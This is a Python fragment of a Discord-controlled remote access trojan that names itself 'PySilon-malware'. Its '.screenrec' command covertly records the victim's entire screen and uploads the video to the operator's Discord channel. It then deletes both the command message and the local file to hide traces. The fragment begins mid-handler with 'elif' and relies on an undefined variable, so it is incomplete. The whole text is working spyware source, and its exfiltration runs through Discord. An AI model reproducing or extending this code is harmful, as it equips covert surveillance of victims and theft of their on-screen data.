import pyautogui
import numpy as np
import subprocess
import time
import imageio
import discord
from getpass import getuser

# On message
elif message.content.startswith('.screenrec'):
    # Parse duration from the message
    try:
        duration = int(message.content.split()[1])
        if duration <= 0:
            raise ValueError("Duration must be greater than 0.")
    except (IndexError, ValueError):
        await message.channel.send("`Usage: .screenrec <seconds>`\nPlease provide a valid duration (in seconds).")
        return

    # Log message indicating recording start
    await message.delete()
    await message.channel.send(f"`Recording for {duration} seconds... Please wait.`")

    # Prepare variables
    output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
    screen_width, screen_height = pyautogui.size()
    screen_region = (0, 0, screen_width, screen_height)
    frames = []
    fps = 30
    num_frames = duration * fps

    try:
        # Record screen
        for _ in range(num_frames):
            img = pyautogui.screenshot(region=screen_region)
            frame = np.array(img)
            frames.append(frame)

        # Save the recording
        imageio.mimsave(output_file, frames, fps=fps, quality=8)

        # Send the recording
        reaction_msg = await message.channel.send("Screen Recording `[On demand]`", file=discord.File(output_file))
        await reaction_msg.add_reaction('📌')

        # Delete the local recording file
        subprocess.run(f'del "{output_file}"', shell=True)
    except Exception as e:
        # Handle and report errors
        embed = discord.Embed(
            title="📛 Error",
            description="An error occurred during screen recording.",
            colour=discord.Colour.red()
        )
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
